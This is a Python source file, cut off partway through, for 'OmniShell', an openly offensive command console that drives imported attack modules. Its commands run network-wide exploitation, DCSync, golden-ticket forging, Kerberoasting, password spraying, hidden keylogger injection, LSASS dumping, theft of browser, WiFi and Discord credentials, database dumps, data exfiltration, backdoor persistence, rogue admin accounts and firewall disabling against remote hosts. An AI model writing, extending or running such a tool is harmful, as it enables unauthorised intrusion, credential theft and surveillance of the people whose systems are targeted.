import asyncio
import sys
import os
import socket
import time
from colorama import Fore, Style, init
from typing import Dict, Any, List
from datetime import datetime

from advanced_scanner import AdvancedNetworkScanner
from lateral_movement import AdvancedCommandCenter
from exploit_engine import UniversalNetworkAccess
from remote_control import AgentlessControl
from exploit_engine import UniversalDevice # Import UniversalDevice for type hinting and usage
from passive_intel import AgentlessIntelligence

# Initialize Colorama
init(autoreset=True)

class AMMOEngine:
    """Asynchronous Multi-threaded Modular Orchestrator (AMMO v2)"""
    def __init__(self):
        self.tasks = []
        self.concurrency_limit = 2000
        self.semaphore = asyncio.Semaphore(self.concurrency_limit)

    async def execute_task(self, coro):
        async with self.semaphore:
            return await coro

class HackerSounds:
    @staticmethod
    def alert(): print(f"{Fore.RED}[!] SOUND: ALERT")
    @staticmethod
    def network_pulse(): print(f"{Fore.CYAN}[*] SOUND: NETWORK PULSE")
    @staticmethod
    def exploit_success(): print(f"{Fore.GREEN}[+] SOUND: EXPLOIT SUCCESS")
    @staticmethod
    def connection_established(): print(f"{Fore.BLUE}[*] SOUND: CONNECTION ESTABLISHED")

class MatrixEffects:
    @staticmethod
    def digital_rain():
        print(f"{Fore.GREEN}[*] VISUAL: DIGITAL RAIN")

class OmniShell:
    def __init__(self):
        self.version = "7.1.005-STABLE"
        self.ammo = AMMOEngine()
        self.targets = []
        self.active_sessions = {}

        # Initialize Functional Engines - PRODUCTION
        self.scanner = AdvancedNetworkScanner()
        self.lateral = AdvancedCommandCenter()
        self.exploiter = UniversalNetworkAccess()
        self.control = AgentlessControl()
        self.intel = AgentlessIntelligence()
        
        # State tracking for the operator
        self.last_target = None
        self.creds = {
            "user": "Administrator",
            "pass": "",
            "domain": "."
        }
        
        self.intel.add_activity_callback(self._on_intel_event)
        
        # Wire modules together for autonomous chains
        self.lateral.set_modules(discovery=self.scanner, intel=self.intel, control=self.control)

    def display_banner(self):
        """Ultra modern intelligence agency banner with live network info."""
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        import urllib.request
        try:
            with urllib.request.urlopen('https://api.ipify.org', timeout=2) as f:
                public_ip = f.read().decode('utf8')
        except:
            public_ip = 'OFFLINE'

        banner_txt = [
            "██████╗ ███╗   ███╗███╗   ██╗██╗███████╗ ██████╗██╗███████╗███╗   ██╗ ██████╗███████╗",
            "██╔═══██╗████╗ ████║████╗  ██║██║██╔════╝██╔════╝██║██╔════╝████╗  ██║██╔════╝██╔════╝",
            "██║   ██║██╔████╔██║██╔██╗ ██║██║███████╗██║     ██║█████╗  ██╔██╗ ██║██║     █████╗  ",
            "██║   ██║██║╚██╔╝██║██║╚██╗██║██║╚════██║██║     ██║██╔══╝  ██║╚██╗██║██║     ██╔══╝  ",
            "╚██████╔╝██║ ╚═╝ ██║██║ ╚████║██║███████╗╚██████╗██║███████╗██║ ╚████║╚██████╗███████╗",
        ]

        print(f"{Fore.LIGHTBLACK_EX}╔{'═'*98}╗")
        for line in banner_txt:
            print(f"{Fore.CYAN}║ {line.center(96)} ║")
        print(f"{Fore.LIGHTBLACK_EX}╠{'═'*98}╣")
        print(f"{Fore.LIGHTBLACK_EX}║ {Fore.LIGHTGREEN_EX}▸ SYSTEM: {sys.platform.upper():<10} {Fore.LIGHTGREEN_EX}▸ HOST: {hostname:<15} {Fore.LIGHTGREEN_EX}▸ LAN: {local_ip:<15} {Fore.LIGHTGREEN_EX}▸ WAN: {public_ip:<15} ║")
        print(f"{Fore.LIGHTBLACK_EX}║ {Fore.MAGENTA}▸ VERSION: {self.version:<10} {Fore.MAGENTA}▸ clearance: TOP_SECRET {'':<14} {Fore.RED}▸ SECURITY: GOVT_OPS_ONLY ║")
        print(f"{Fore.LIGHTBLACK_EX}╚{'═'*98}╝")
        print(f"{Fore.YELLOW}[i] Terminal Ready. Command Interface Active.\n")

    def _on_intel_event(self, event):
        """Handles background intelligence events."""
        if event.get("type") == "credential":
            print(f"\n{Fore.MAGENTA}[INTEL] ALERT: Credential harvested from {event.get('source')}")

    async def start(self):
        """Starts the interactive shell loop asynchronously."""
        self.display_banner()
        while True:
            cmd = await asyncio.to_thread(input, f"{Fore.CYAN}omniscence> {Style.RESET_ALL}")
            await self.handle_command(cmd)

    async def handle_command(self, cmd_input: str):
        parts = cmd_input.split()
        if not parts: return
        
        cmd = parts[0].lower()
        args = parts[1:]

        if cmd in ["exit", "quit"]:
            print(f"{Fore.YELLOW}Shutting down AMMO engine...")
            sys.exit(0)
        
        # --- SCANNING CATEGORY ---
        elif cmd in ["globalscan", "auto"]:
            print(f"{Fore.GREEN}[*] Initiating ULTRAMAX Global Network Discovery...")
            self.targets = await asyncio.to_thread(self.exploiter.ultramax_global_scan)
            print(f"{Fore.GREEN}[+] Scan Complete. {len(self.targets)} active targets identified.")

        elif cmd == "scan":
            target_range = args[0] if args else self.scanner.network_range
            print(f"{Fore.CYAN}[*] Scanning range: {target_range}...")
            results = await asyncio.to_thread(self.exploiter.discover_all_devices, target_range)
            self.targets = results
            print(f"{Fore.GREEN}[+] Discovery complete. Found {len(results)} hosts.")

        elif cmd == "fastscan":
            print(f"{Fore.CYAN}[*] Performing quick 10-second network sweep...")
            # This can be a subset of discover_all_devices or a faster version
            results = await asyncio.to_thread(self.exploiter.discover_all_devices, self.scanner._get_network_range())
            self.targets = results
            print(f"{Fore.GREEN}[+] Quick sweep complete. Found {len(results)} hosts.")

        elif cmd == "arp":
            target_range = args[0] if args else self.scanner._get_network_range()
            print(f"{Fore.CYAN}[*] Performing ARP scan on {target_range}...")
            results = await asyncio.to_thread(self.scanner._arp_scan, target_range)
            for dev in results:
                print(f"  [+] {dev['ip']} ({dev['mac']})")
            print(f"{Fore.GREEN}[+] ARP scan complete. Found {len(results)} devices.")

        elif cmd == "icmp":
            target_range = args[0] if args else self.scanner._get_network_range()
            print(f"{Fore.CYAN}[*] Performing ICMP sweep on {target_range}...")
            results = await asyncio.to_thread(self.scanner._icmp_sweep, target_range)
            for dev in results:
                print(f"  [+] {dev['ip']}")
            print(f"{Fore.GREEN}[+] ICMP sweep complete. Found {len(results)} devices.")

        elif cmd == "netbios":
            target_range = args[0] if args else self.scanner._get_network_range()
            print(f"{Fore.CYAN}[*] Performing NetBIOS enumeration on {target_range}...")
            results = await asyncio.to_thread(self.scanner._netbios_sweep, target_range)
            for dev in results:
                print(f"  [+] {dev['ip']} ({dev['hostname']})")
            print(f"{Fore.GREEN}[+] NetBIOS scan complete. Found {len(results)} devices.")

        elif cmd == "wmi-software":
            target = args[0] if args else self.last_target
            res = await asyncio.to_thread(self.control.get_installed_programs, target, self.creds['user'], self.creds['pass'])
            for s in res: print(f"  [+] {s.get('DisplayName')} v{s.get('DisplayVersion')}")

        elif cmd == "snmp":
            target_ip = args[0] if args else self.last_target
            if not target_ip: return
            print(f"{Fore.CYAN}[*] Performing SNMP community scan on {target_ip}...")
            device = self.exploiter.devices.get(target_ip, UniversalDevice(target_ip))
            await asyncio.to_thread(self.exploiter.try_snmp_community, device)
            if "snmp_community" in device.harvested:
                print(f"{Fore.GREEN}[+] SNMP access via '{device.harvested['snmp_community']}'")
            else:
                print(f"{Fore.RED}[!] SNMP access failed.")

        elif cmd == "mdns":
            print(f"{Fore.CYAN}[*] Performing mDNS service discovery...")
            results = await asyncio.to_thread(self.scanner.mdns_listen)
            for dev in results:
                print(f"  [+] {dev['ip']} ({dev['type']})")
            print(f"{Fore.GREEN}[+] mDNS discovery complete. Found {len(results)} devices.")

        elif cmd == "ssdp":
            print(f"{Fore.CYAN}[*] Performing SSDP/UPnP discovery...")
            results = await asyncio.to_thread(self.scanner.ssdp_discover)
            for dev in results:
                print(f"  [+] {dev['ip']} ({dev['type']})")
            print(f"{Fore.GREEN}[+] SSDP discovery complete. Found {len(results)} devices.")

        elif cmd == "traceroute":
            if not args: return
            print(f"{Fore.CYAN}[*] Mapping path to {args[0]}...")
            hops = await asyncio.to_thread(self.scanner.traceroute_with_services, args[0])
            for hop in hops:
                print(f"  {hop.hop_num:<2} | {hop.ip or '*':<15} | {hop.rtt or 0.0:>6.1f} ms | {hop.asn}")

        elif cmd == "topology":
            print(f"{Fore.CYAN}[*] Generating network topology map...")
            topo = await asyncio.to_thread(self.scanner.get_topology_map)
            print(f"{Fore.GREEN}[+] Topology generated. Devices: {len(topo['devices'])}, Connections: {len(topo['connections'])}")
            # Optionally print a summary or save to file
            # print(json.dumps(topo, indent=2))

        elif cmd == "interfaces":
            print(f"{Fore.CYAN}[*] Listing network interfaces...")
            info = await asyncio.to_thread(self.scanner.get_interface_info)
            for iface in info:
                print(f"  [+] {iface['name']}: {iface['ip']} ({iface['netmask']})")

        elif cmd == "gateway":
            print(f"{Fore.CYAN}[*] Detecting network gateway...")
            gw = await asyncio.to_thread(self.scanner._detect_gateway)
            print(f"{Fore.GREEN}[+] Gateway: {gw}")

        elif cmd == "vpn":
            print(f"{Fore.CYAN}[*] Auditing gateway for VPN endpoints...")
            info = await asyncio.to_thread(self.scanner.discover_vpn_networks)
            for v in info:
                print(f"  [+] DETECTED: {v['ip']}:{v['port']} ({v['type']})")

        elif cmd == "external-ip":
            import urllib.request
            try:
                ext = urllib.request.urlopen('https://api.ipify.org').read().decode()
                print(f"{Fore.GREEN}[+] External IP: {ext}")
            except: print(f"{Fore.RED}[!] Offline.")

        elif cmd == "targets":
            # This command is already handled
            self.list_targets()

        # --- ATTACK CATEGORY ---
        elif cmd in ["pwnall", "attack"]:
            if not self.targets:
                print(f"{Fore.RED}[!] No targets discovered. Execute 'globalscan' to map the environment.")
                return
            
            print(f"{Fore.RED}{Style.BRIGHT}[!] INITIATING AUTONOMOUS NETWORK DOMINATION SEQUENCE...")
            MatrixEffects.digital_rain()
            HackerSounds.alert()
            
            # Phase 1: Real pwn_all_devices chain
            results = await asyncio.to_thread(self.exploiter.pwn_all_devices)
            print(f"{Fore.GREEN}{Style.BRIGHT}[+] EXPLOITATION COMPLETE. COMPROMISED: {len(results['exploited'])} hosts.")
            HackerSounds.exploit_success()

        elif cmd == "dcsync":
            if not args: return
            res = await asyncio.to_thread(self.control.dcsync, args[0], self.creds['user'], self.creds['pass'], (args[1] if len(args) > 1 else None))
            print(f"{Fore.GREEN}[+] Replication Dump: {res}")

        elif cmd == "golden":
            if len(args) < 3: return
            path = await asyncio.to_thread(self.control.golden_ticket, args[0], args[1], args[2])
            print(f"{Fore.GREEN}[+] Ticket forged: {path}")

        elif cmd == "pwn":
            if not args: return
            print(f"{Fore.RED}[*] Launching precision exploit on {args[0]}...")
            result = await asyncio.to_thread(self.exploiter.pwn_target, args[0])
            if result.get("success"):
                print(f"{Fore.GREEN}[+] ACCESS GRANTED: {result.get('method')}")
                self.last_target = args[0]
            else:
                print(f"{Fore.RED}[!] Exploit failed. Target may be patched.")

        elif cmd == "exploit":
            if not args: return
            target_ip = args[0]
            print(f"{Fore.RED}[*] Executing advanced exploit chain on {target_ip}...")
            result = await asyncio.to_thread(self.control.exploit_target, target_ip)
            if result.get("success"):
                print(f"{Fore.GREEN}[+] Exploit chain successful: {result.get('method')}")
                self.last_target = target_ip
            else:
                print(f"{Fore.RED}[!] Exploit chain failed: {result.get('error')}")

        elif cmd == "mobile":
            if not args: return
            target_ip = args[0]
            print(f"{Fore.RED}[*] Attempting mobile device auto-exploitation on {target_ip}...")
            result = await asyncio.to_thread(self.control.mobile_exploit_auto, target_ip)
            if result.get("success"):
                print(f"{Fore.GREEN}[+] Mobile exploit successful: {result.get('method')}")
                self.last_target = target_ip
            else:
                print(f"{Fore.RED}[!] Mobile exploit failed: {result.get('error')}")

        elif cmd == "scan-exploit":
            if not args: return
            target_range = args[0]
            print(f"{Fore.RED}[*] Scanning and auto-exploiting range {target_range}...")
            results = await asyncio.to_thread(self.control.scan_and_exploit_network, target_range)
            print(f"{Fore.GREEN}[+] Scan-exploit complete. Exploited: {len(results['exploited'])}, Creds: {len(results['credentials'])}")

        elif cmd == "kerberoast":
            if not args: return
            dc_ip = args[0]
            domain = args[1] if len(args) > 1 else ""
            print(f"{Fore.RED}[*] Performing Kerberoasting attack on {dc_ip} (Domain: {domain})...")
            results = await asyncio.to_thread(self.control.kerberoast, dc_ip, domain)
            if results.get("success"):
                print(f"{Fore.GREEN}[+] Kerberoasting successful. SPNs found: {len(results.get('spn_found', []))}")
            else:
                print(f"{Fore.RED}[!] Kerberoasting failed: {results.get('error')}")

        elif cmd == "password-spray":
            if not args: return
            target_domain = args[0]
            users = args[1].split(',') if len(args) > 1 else ["Administrator", "Guest"] # Example users
            passwords = args[2].split(',') if len(args) > 2 else ["Password1", "Welcome1"] # Example passwords
            print(f"{Fore.RED}[*] Performing password spray on {target_domain}...")
            results = await asyncio.to_thread(self.control.password_spray, target_domain, users, passwords)
            if results.get("success"):
                print(f"{Fore.GREEN}[+] Password spray successful. Valid creds: {len(results.get('valid_credentials', []))}")
            else:
                print(f"{Fore.RED}[!] Password spray failed: {results.get('error')}")

        elif cmd == "lateral":
            if len(args) < 2: return
            source_ip = args[0]
            target_ip = args[1]
            print(f"{Fore.RED}[*] Attempting lateral movement from {source_ip} to {target_ip}...")
            results = await asyncio.to_thread(self.control.lateral_movement, source_ip, target_ip, self.creds)
            if results.get("success"):
                print(f"{Fore.GREEN}[+] Lateral movement successful via {results.get('method_used')}")
            else:
                print(f"{Fore.RED}[!] Lateral movement failed: {results.get('error')}")

        elif cmd == "smbghost":
            if not args: return
            res = await asyncio.to_thread(self.control.check_smbghost, args[0])
            print(f"{Fore.YELLOW}[*] SMBGhost Result: {'VULNERABLE' if res['vulnerable'] else 'Safe'}")

        elif cmd == "zerologon":
            if not args: return
            res = await asyncio.to_thread(self.control.check_zerologon, args[0])
            print(f"{Fore.YELLOW}[*] Zerologon Result: {res['details']}")

        elif cmd == "printnightmare":
            if not args: return
            res = await asyncio.to_thread(self.control.check_printnightmare, args[0], self.creds['user'], self.creds['pass'])
            print(f"{Fore.YELLOW}[*] PrintNightmare Result: {res['details']}")

        elif cmd == "petitpotam":
            if not args: return
            res = await asyncio.to_thread(self.control.check_petitpotam, args[0])
            print(f"{Fore.YELLOW}[*] PetitPotam Result: {res['details']}")

        elif cmd == "smb-vulns":
            if not args: return
            res = await asyncio.to_thread(self.control.smb_check_vulns, args[0])
            print(f"{Fore.YELLOW}[*] SMB Vulnerabilities for {args[0]}: {res.get('vulns', [])}")

        elif cmd == "etblue-check":
            if not args: return
            target_ip = args[0]
            device = self.exploiter.devices.get(target_ip, UniversalDevice(target_ip))
            await asyncio.to_thread(self.exploiter._try_eternal_blue_check, device)
            if "CVE-2017-0143_ETERNALBLUE" in device.is_vulnerable:
                print(f"{Fore.RED}[!] {target_ip} is VULNERABLE to EternalBlue!")
            else:
                print(f"{Fore.GREEN}[+] {target_ip} is NOT vulnerable to EternalBlue (or check failed).")

        elif cmd == "bluekeep-check":
            if not args: return
            target_ip = args[0]
            # BlueKeep check is complex, often involves specific RDP packets.
            # For now, check if RDP port is open.
            if 3389 in self.exploiter.devices.get(target_ip, UniversalDevice(target_ip)).open_ports:
                print(f"{Fore.YELLOW}[*] RDP port 3389 is open on {target_ip}. BlueKeep *might* be possible. Manual verification needed.")
            else:
                print(f"{Fore.GREEN}[+] RDP port 3389 is closed on {target_ip}. Not a BlueKeep candidate.")

        # --- REMOTE CONTROL CATEGORY ---
        elif cmd == "exec":
            if not args: return
            target = self.last_target if self.last_target else args[0]
            command = " ".join(args[1:]) if self.last_target else " ".join(args[1:])
            print(f"{Fore.CYAN}[*] Executing on {target}...")
            res = await asyncio.to_thread(self.control.wmi_exec, target, self.creds['user'], self.creds['pass'], command)
            print(f"{Fore.WHITE}{res.get('output', 'No Output')}")

        elif cmd == "screen":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.MAGENTA}[*] Capturing remote desktop of {target}...")
            path = await asyncio.to_thread(self.control.remote_screenshot, target, self.creds['user'], self.creds['pass'])
            if path: print(f"{Fore.GREEN}[+] Screenshot saved: {path}")

        elif cmd == "keylog":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.RED}[*] Injecting hidden keylogger on {target}...")
            await asyncio.to_thread(self.control.wmi_keylogger_start, target, self.creds['user'], self.creds['pass'])
            print(f"{Fore.GREEN}[+] Keylogger active. Intercepting keystrokes...")

        elif cmd == "play-media":
            if not args: return
            await asyncio.to_thread(self.control.play_media_url, self.last_target, self.creds['user'], self.creds['pass'], args[0])

        elif cmd in ["shutdown", "reboot", "logoff"]:
            target = args[0] if args else self.last_target
            if not target: return
            action = cmd
            print(f"{Fore.RED}[*] Initiating {action} on {target}...")
            res = await asyncio.to_thread(self.control.shutdown, target, self.creds['user'], self.creds['pass'], action)
            if res: print(f"{Fore.GREEN}[+] {action.capitalize()} command sent successfully.")
            else: print(f"{Fore.RED}[!] Failed to send {action} command.")

        elif cmd == "winrm-exec":
            if len(args) < 2: return
            target_ip = args[0]
            command = " ".join(args[1:])
            print(f"{Fore.CYAN}[*] Executing via WinRM on {target_ip}: {command}...")
            res = await asyncio.to_thread(self.control.winrm_exec, target_ip, self.creds['user'], self.creds['pass'], command)
            print(f"{Fore.WHITE}{res.get('output', 'No Output')}")

        elif cmd in ["sysinfo", "systeminfo"]:
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.CYAN}[*] Extracting system properties from {target}...")
            info = await asyncio.to_thread(self.control.get_full_system_info, target, self.creds['user'], self.creds['pass'])
            if info.get('success'):
                si = info['system_info']
                print(f"  OS: {si.get('os_name')} ({si.get('os_architecture')})")
                print(f"  CPU: {si.get('processor')} | RAM: {si.get('ram_total')}MB")
            else:
                print(f"{Fore.RED}[!] Failed to get system info: {info.get('error')}")

        elif cmd == "pslist":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.CYAN}[*] Listing processes on {target}...")
            procs = await asyncio.to_thread(self.control.list_processes, target, self.creds['user'], self.creds['pass'])
            for p in procs[:10]: # Print first 10
                print(f"  PID: {p.get('ProcessId')}, Name: {p.get('Name')}, Cmd: {p.get('CommandLine', '')[:50]}")
            print(f"{Fore.GREEN}[+] Found {len(procs)} processes.")

        elif cmd == "killproc":
            if not args: return
            target = self.last_target if self.last_target else args[0]
            pid = int(args[1]) if self.last_target else int(args[0])
            print(f"{Fore.RED}[*] Killing process {pid} on {target}...")
            res = await asyncio.to_thread(self.control.kill_process, target, self.creds['user'], self.creds['pass'], pid=pid)
            if res: print(f"{Fore.GREEN}[+] Process {pid} killed.")
            else: print(f"{Fore.RED}[!] Failed to kill process {pid}.")

        elif cmd == "svc-list":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.CYAN}[*] Listing services on {target}...")
            services = await asyncio.to_thread(self.control.list_services, target, self.creds['user'], self.creds['pass'])
            for s in services[:10]: # Print first 10
                print(f"  Name: {s.get('Name')}, State: {s.get('State')}, Path: {s.get('PathName', '')[:50]}")
            print(f"{Fore.GREEN}[+] Found {len(services)} services.")

        # --- DATA EXTRACTION CATEGORY ---
        elif cmd in ["extract", "harvest", "omnifetch"]:
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.MAGENTA}[*] Executing deep extraction payload on {target}...")
            data = await asyncio.to_thread(self.control.extract_all_data, target, self.creds['user'], self.creds['pass'])
            print(f"{Fore.GREEN}[+] Data recovered: {len(data.get('credentials', {}))} items.")

        elif cmd == "wget":
            if len(args) < 2: return
            await asyncio.to_thread(self.control.download_file_from_url, self.last_target, self.creds['user'], self.creds['pass'], args[0], args[1])
            print(f"{Fore.GREEN}[+] IO Stream complete.")

        elif cmd == "cloudscan":
            provider = args[0] if args else "aws"
            print(f"{Fore.BLUE}[*] Scanning public {provider.upper()} ranges...")
            cloud_hosts = await asyncio.to_thread(self.scanner.scan_public_ranges, provider)
            print(f"{Fore.GREEN}[+] Identified {len(cloud_hosts)} potential cloud targets.")

        elif cmd == "steal-wifi":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.MAGENTA}[*] Extracting WiFi passwords from {target}...")
            res = await asyncio.to_thread(self.control.get_wifi_passwords, target, self.creds['user'], self.creds['pass'])
            if res.get('networks'):
                for ssid, pw in res['networks'].items():
                    print(f"  SSID: {ssid}, Password: {pw}")
            else:
                print(f"{Fore.RED}[!] No WiFi passwords extracted or failed.")

        elif cmd == "stealcreds":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.MAGENTA}[*] Extracting browser saved credentials from {target}...")
            res = await asyncio.to_thread(self.control.get_browser_passwords, target, self.creds['user'], self.creds['pass'])
            if res.get('passwords'):
                for p in res['passwords']:
                    print(f"  Browser: {p.get('browser')}, URL: {p.get('url')}, User: {p.get('user')}")
            else:
                print(f"{Fore.RED}[!] No browser credentials extracted or failed.")

        elif cmd == "lsass-dump":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.RED}[*] Triggering LSASS memory dump on {target} (Minidump method)...")
            res = await asyncio.to_thread(self.control.lsass_dump, target, self.creds['user'], self.creds['pass'])
            if res.get('success'): print(f"{Fore.GREEN}[+] Dump complete: {res.get('unc')}")
            else: print(f"{Fore.RED}[!] Failed: {res.get('error')}")

        elif cmd == "tokens":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.MAGENTA}[*] Extracting authentication tokens from {target}...")
            res = await asyncio.to_thread(self.control.steal_saved_credentials, target, self.creds['user'], self.creds['pass'])
            if res.get('browsers'):
                print(f"{Fore.GREEN}[+] Browser tokens harvested.")
            if res.get('windows'):
                print(f"{Fore.GREEN}[+] Windows tokens harvested.")
            else:
                print(f"{Fore.RED}[!] No tokens extracted or failed.")

        elif cmd == "nethashes":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.MAGENTA}[*] Extracting NT/LM password hashes from {target}...")
            res = await asyncio.to_thread(self.control.extract_nt_hashes, target, self.creds['user'], self.creds['pass'])
            if res:
                for h in res:
                    print(f"  Name: {h.get('Name')}, SID: {h.get('SID')}, Source: {h.get('Source')}")
            else:
                print(f"{Fore.RED}[!] No hashes extracted or failed.")

        elif cmd == "vault":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.MAGENTA}[*] Harvesting secure vault contents from {target} (Discord, etc.)...")
            res = await asyncio.to_thread(self.control.wmi_harvest_vault, target, self.creds['user'], self.creds['pass'])
            if res.get('discord_tokens'):
                print(f"{Fore.GREEN}[+] Discord tokens found: {res['discord_tokens']}")
            else:
                print(f"{Fore.RED}[!] No vault items extracted or failed.")

        # --- PASSIVE INTELLIGENCE ---
        elif cmd == "sniff":
            print(f"{Fore.CYAN}[*] Initializing passive traffic interceptor...")
            threading.Thread(target=self.intel.start_sniffing, daemon=True).start()
            print(f"{Fore.GREEN}[+] Sniffer active. Type 'creds' to view intercepted tokens.")

        elif cmd == "creds":
            captured = self.intel.get_credentials()
            print(f"\n{Fore.MAGENTA}CAPTURED CREDENTIALS / TOKENS:")
            for c in captured:
                print(f"  [{c['time'].strftime('%H:%M:%S')}] {c['source']} -> {c['data']}")

        # --- DATABASE & CLOUD CATEGORY ---
        elif cmd == "db-extract":
            if len(args) < 3: return
            target_ip, port, db_type = args[0], int(args[1]), args[2]
            print(f"{Fore.BLUE}[*] Extracting database content from {target_ip}:{port} ({db_type})...")
            res = await asyncio.to_thread(self.control.database_extract, target_ip, port, db_type, self.creds['user'], self.creds['pass'])
            if res.get('connected'):
                print(f"{Fore.GREEN}[+] Connected to DB. Databases: {res.get('databases')}, Tables: {len(res.get('tables', []))}")
            else:
                print(f"{Fore.RED}[!] DB extraction failed: {res.get('error')}")

        elif cmd == "db-dump":
            if len(args) < 3: return
            target_ip, port, db_type = args[0], int(args[1]), args[2]
            print(f"{Fore.BLUE}[*] Performing full database dump from {target_ip}:{port} ({db_type})...")
            res = await asyncio.to_thread(self.control.full_database_dump, target_ip, port, db_type, self.creds['user'], self.creds['pass'])
            if res.get('connected'):
                print(f"{Fore.GREEN}[+] Full DB dump complete. Tables extracted: {res.get('tables_extracted')}, Total rows: {res.get('total_rows')}")
            else:
                print(f"{Fore.RED}[!] Full DB dump failed: {res.get('error')}")

        elif cmd == "cloud-attack":
            if len(args) < 2: return
            service_type, target = args[0], args[1]
            print(f"{Fore.BLUE}[*] Launching cloud attack on {target} ({service_type})...")
            res = await asyncio.to_thread(self.control.cloud_service_attack, service_type, target)
            if res.get('vulnerable'):
                print(f"{Fore.RED}[!] Cloud service vulnerable. Compromised: {res.get('compromised')}")
            else:
                print(f"{Fore.GREEN}[+] Cloud service not vulnerable or attack failed.")

        elif cmd == "s3-scan":
            if not args: return
            bucket_name = args[0]
            print(f"{Fore.BLUE}[*] Scanning S3 bucket {bucket_name} for misconfigurations...")
            res = await asyncio.to_thread(self.control.cloud_service_attack, "s3", bucket_name)
            if res.get('vulnerable'):
                print(f"{Fore.RED}[!] S3 bucket vulnerable. Anonymous upload: {res.get('anonymous_upload')}")
            else:
                print(f"{Fore.GREEN}[+] S3 bucket secure or scan failed.")

        elif cmd == "mysql-root":
            if not args: return
            target_ip = args[0]
            print(f"{Fore.BLUE}[*] Attempting MySQL root access on {target_ip}...")
            # This would use exploiter._try_mysql_no_auth or control.database_extract with root creds
            device = self.exploiter.devices.get(target_ip, UniversalDevice(target_ip))
            await asyncio.to_thread(self.exploiter._try_mysql_no_auth, device)
            if device.access_method == "mysql":
                print(f"{Fore.GREEN}[+] MySQL root access gained with {device.access_credential[0]}:{device.access_credential[1]}")
            else:
                print(f"{Fore.RED}[!] MySQL root access failed.")

        elif cmd == "postgres":
            if not args: return
            target_ip = args[0]
            print(f"{Fore.BLUE}[*] Attempting PostgreSQL access on {target_ip}...")
            device = self.exploiter.devices.get(target_ip, UniversalDevice(target_ip))
            await asyncio.to_thread(self.exploiter._try_postgres_no_auth, device)
            if device.access_method == "postgresql":
                print(f"{Fore.GREEN}[+] PostgreSQL access gained with {device.access_credential[0]}:{device.access_credential[1]}")
            else:
                print(f"{Fore.RED}[!] PostgreSQL access failed.")

        elif cmd == "exfiltrate":
            if len(args) < 2: return
            target_ip, local_path = args[0], args[1]
            exfil_method = args[2] if len(args) > 2 else "smb"
            print(f"{Fore.RED}[*] Exfiltrating {local_path} to {target_ip} via {exfil_method}...")
            res = await asyncio.to_thread(self.control.data_exfiltration, target_ip, local_path, exfil_method)
            if res.get('success'):
                print(f"{Fore.GREEN}[+] Data exfiltration successful. Transferred {res.get('bytes_transferred')} bytes.")
            else:
                print(f"{Fore.RED}[!] Data exfiltration failed: {res.get('error')}")

        # --- PERSISTENCE CATEGORY ---
        elif cmd == "persist":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.RED}[*] Installing 3-layer persistence backdoor on {target}...")
            res = await asyncio.to_thread(self.control.establish_persistent_connection, target, self.creds['user'], self.creds['pass'])
            if res.get('backdoor_active'):
                print(f"{Fore.GREEN}[+] Persistence installed: {res.get('persistence_installed')}")
            else:
                print(f"{Fore.RED}[!] Persistence installation failed.")

        elif cmd == "persist-task":
            if len(args) < 2: return
            target = self.last_target if self.last_target else args[0]
            task_name = args[1] if self.last_target else args[0]
            command = " ".join(args[2:]) if self.last_target else " ".join(args[1:])
            print(f"{Fore.RED}[*] Creating scheduled task '{task_name}' on {target}...")
            res = await asyncio.to_thread(self.control.create_scheduled_task, target, self.creds['user'], self.creds['pass'], task_name, command)
            if res: print(f"{Fore.GREEN}[+] Scheduled task created.")
            else: print(f"{Fore.RED}[!] Failed to create scheduled task.")

        elif cmd == "adduser":
            if len(args) < 2: return
            target = self.last_target if self.last_target else args[0]
            new_user = args[1] if self.last_target else args[0]
            new_pass = args[2] if len(args) > 2 else "P@ssw0rd123!"
            print(f"{Fore.RED}[*] Creating admin user '{new_user}' on {target}...")
            res = await asyncio.to_thread(self.control.add_local_user, target, self.creds['user'], self.creds['pass'], new_user, new_pass)
            if res: print(f"{Fore.GREEN}[+] User '{new_user}' created and added to Administrators.")
            else: print(f"{Fore.RED}[!] Failed to create user.")

        elif cmd == "rdp-enable":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.RED}[*] Enabling RDP on {target}...")
            res = await asyncio.to_thread(self.control.enable_rdp, target, self.creds['user'], self.creds['pass'])
            if res: print(f"{Fore.GREEN}[+] RDP enabled.")
            else: print(f"{Fore.RED}[!] Failed to enable RDP.")

        elif cmd == "firewall-off":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.RED}[*] Disabling firewall on {target}...")
            res = await asyncio.to_thread(self.control.disable_firewall, target, self.creds['user'], self.creds['pass'])
            if res: print(f"{Fore.GREEN}[+] Firewall disabled.")
            else: print(f"{Fore.RED}[!] Failed to disable firewall.")

        elif cmd == "firewall-on":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.GREEN}[*] Enabling firewall on {target}...")
            res = await asyncio.to_thread(self.control.enable_firewall, target, self.creds['user'], self.creds['pass'])
            if res: print(f"{Fore.GREEN}[+] Firewall enabled.")
            else: print(f"{Fore.RED}[!] Failed to enable firewall.")

        elif cmd == "firewall-add":
            if len(args) < 2: return
            target = self.last_target if self.last_target else args[0]
            port = int(args[1]) if self.last_target else int(args[0])
            print(f"{Fore.RED}[*] Adding firewall exception for port {port} on {target}...")
            res = await asyncio.to_thread(self.control.add_firewall_exception, target, self.creds['user'], self.creds['pass'], port)
            if res: print(f"{Fore.GREEN}[+] Firewall exception added for port {port}.")
            else: print(f"{Fore.RED}[!] Failed to add firewall exception.")

        # --- BRUTE FORCE CATEGORY ---
        elif cmd == "ssh-brute":
            if not args: return
            target_ip = args[0]
            print(f"{Fore.RED}[*] Performing SSH brute force on {target_ip}...")
            res = await asyncio.to_thread(self.control.ssh_brute, target_ip)
            if res:
                for c in res: print(f"  [+] HIT: {c.get('user')}:{c.get('password')}")
            else:
